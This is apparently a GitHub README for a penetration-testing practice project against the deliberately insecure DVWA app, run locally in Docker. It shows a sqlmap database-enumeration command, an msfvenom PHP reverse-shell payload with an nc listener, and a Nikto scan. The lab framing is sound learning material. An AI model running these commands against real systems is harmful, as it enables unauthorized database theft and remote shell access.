# DVWA Vulnerability Assessment

This project documents the process of identifying and exploiting various vulnerabilities in the **Damn Vulnerable Web Application (DVWA)**, a deliberately insecure web application designed for practicing penetration testing techniques.

---

## **Table of Contents**
1. [Project Overview](#project-overview)
2. [Setup](#setup)
   - [Installing DVWA Using Docker](#installing-dvwa-using-docker)
3. [Vulnerabilities Explored](#vulnerabilities-explored)
   - [1. SQL Injection](#1-sql-injection)
   - [2. File Upload Vulnerability](#2-file-upload-vulnerability)
   - [3. General Vulnerability Testing Using Nikto](#3-general-vulnerability-testing-using-nikto)
4. [Tools Used](#tools-used)
5. [Screenshots](#screenshots)
6. [Writeups](#writeups)
   - [SQL Injection Writeup](sql-injection.md)
   - [File Upload Vulnerability Writeup](file-upload.md)

---

## **Project Overview**
The goal of this project is to demonstrate practical penetration testing skills by:
1. Setting up a DVWA instance using Docker.
2. Exploring and exploiting vulnerabilities in the application, including SQL Injection and File Upload vulnerabilities.
3. Using tools such as `sqlmap`, `Nikto`, and `msfvenom` to perform the assessment.
4. Providing detailed documentation for each vulnerability with remediation suggestions.

---

## **Setup**

### Installing DVWA Using Docker
The following steps were performed to set up DVWA using Docker:

1. **Start and Enable Docker**:
   ```bash
   sudo systemctl start docker
   sudo systemctl enable docker
   ```

2. **Pull DVWA Docker Image**:
   ```bash
   sudo docker pull vulnerables/web-dvwa
   ```

3. **Run DVWA**:
   ```bash
   sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
   ```

Refer to the screenshot below for the commands executed:
![Installing DVWA Using Docker]((https://github.com/user-attachments/assets/2b7ba66e-c526-4b87-8d1e-35932f432ab4)
)

4. Access the application at `http://127.0.0.1` and set the **security level to Low**.

---

## **Vulnerabilities Explored**

### 1. SQL Injection
- **Objective**: Exploit the SQL Injection vulnerability to extract sensitive information.
- **Steps**:
  1. Navigated to the **SQL Injection** module in DVWA.
  2. Used `sqlmap` to automate the exploitation.
     ```bash
     sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit" \
            --cookie="PHPSESSID=<SESSION_ID>; security=low" --dbs
     ```
  3. Successfully enumerated the databases and confirmed the application is vulnerable.

For a detailed writeup, see: [SQL Injection Writeup](sql-injection.md)

---

### 2. File Upload Vulnerability
- **Objective**: Exploit the File Upload vulnerability to upload a malicious PHP payload.
- **Steps**:
  1. Used `msfvenom` to create a reverse shell payload:
     ```bash
     msfvenom -p php/reverse_php LHOST=192.168.191.128 LPORT=4444 -f raw > shell.php
     ```
  2. Uploaded the payload via the File Upload module.
  3. Triggered the payload and successfully established a reverse shell using Netcat:
     ```bash
     nc -lvnp 4444
     ```
For a detailed writeup, see: [File Upload Vulnerability Writeup](file-upload.md)

---

### 3. General Vulnerability Testing Using Nikto
- **Objective**: Scan for general vulnerabilities using `Nikto`.
- **Steps**:
  1. Ran a `Nikto` scan on the application:
     ```bash
     nikto -h http://127.0.0.1
     ```
  2. Identified issues such as outdated Apache version and missing security headers.

---

## **Tools Used**
1. **Docker**: For running the DVWA container.
2. **Nikto**: To scan for general web application vulnerabilities.
3. **Sqlmap**: To automate SQL Injection attacks.
4. **Msfvenom**: For generating a malicious PHP reverse shell payload.
5. **Netcat**: For establishing a reverse shell connection.

---

## **Screenshots**
1. ![SQLmap Command Execution]((https://github.com/user-attachments/assets/9be88cbf-7e4f-45ee-8f6d-942268c6ecfd))
   
2. ![SQLmap Results]((https://github.com/user-attachments/assets/2ea824fc-d18e-43b7-8d4c-1dc6347768e2)
)
3. ![Nikto Scan Results]((https://github.com/user-attachments/assets/c5d334f2-ca77-47e4-97e0-f3206880479c)
)
4. ![Reverse Shell Connection]((https://github.com/user-attachments/assets/3dc931c8-7e55-4e63-aa7d-3310bcc36991)
)

---

## **Writeups**

- [SQL Injection Writeup](sql-injection.md)
- [File Upload Vulnerability Writeup](file-upload.md)
- [Nikto Scan Writeup](nikto-scan.md)

Refer to individual writeups for detailed steps, analysis, and mitigation suggestions.

